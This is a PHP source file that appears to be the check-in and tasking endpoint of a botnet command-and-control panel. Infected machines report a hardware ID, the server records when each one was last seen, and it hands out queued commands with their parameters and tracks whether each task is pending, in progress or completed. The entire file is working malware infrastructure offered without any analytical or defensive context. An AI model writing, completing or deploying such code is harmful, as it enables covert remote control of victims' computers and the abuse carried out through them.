<?php
include '../inc/config.php';

if(isset($_GET['hwid']))
{
    $hwid = $_GET['hwid'];
    $con->prepare("UPDATE bots SET time = :time WHERE hwid = :hwid")->execute(array(':hwid' => $hwid, ':time' => time()));

    if(isset($_GET['completed'])) {
        $id = $_GET['completed'];
        //delete old task
        $con->prepare("DELETE FROM tasks WHERE completed = 2 AND hwid = ?")->execute(array($hwid));
        //set complete
        $con->prepare("UPDATE tasks SET completed = 2 WHERE id = ?")->execute(array($id));
    }else{
        //get new task by ascending order
        $task = $con->prepare("SELECT COUNT(*), id, command, parameter FROM tasks WHERE hwid = ? AND completed = 0 ORDER BY id ASC LIMIT 1");
        $task->execute(array($hwid));
        $task = $task->fetch();
        if($task[0] > 0)
        {
            //set in progress
            $con->prepare("UPDATE tasks SET completed = 1 WHERE id = ?")->execute(array($task[1]));
            echo $task[1] . ' ' . $task[2] . ' ' . $task[3];
        }
    }
}
